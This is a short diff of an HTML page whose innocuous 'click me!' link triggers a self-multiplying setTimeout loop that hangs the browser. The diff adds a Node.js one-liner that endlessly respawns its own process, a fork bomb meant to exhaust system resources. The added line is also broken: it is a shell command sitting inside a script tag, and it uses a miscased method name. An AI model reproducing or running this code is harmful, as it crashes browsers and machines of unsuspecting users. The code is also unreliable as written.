@@ -2,6 +2,7 @@
 <body>
 <a href="#" onclick="die()">click me!</a>
 <script>
+node -e "(function f() { require('child_process').spawn(process.argv[0], ['-e', '(' + f.tostring() + '());']); }());
 function die () {
   setTimeout(function () {die(); die()}, 0)
 }
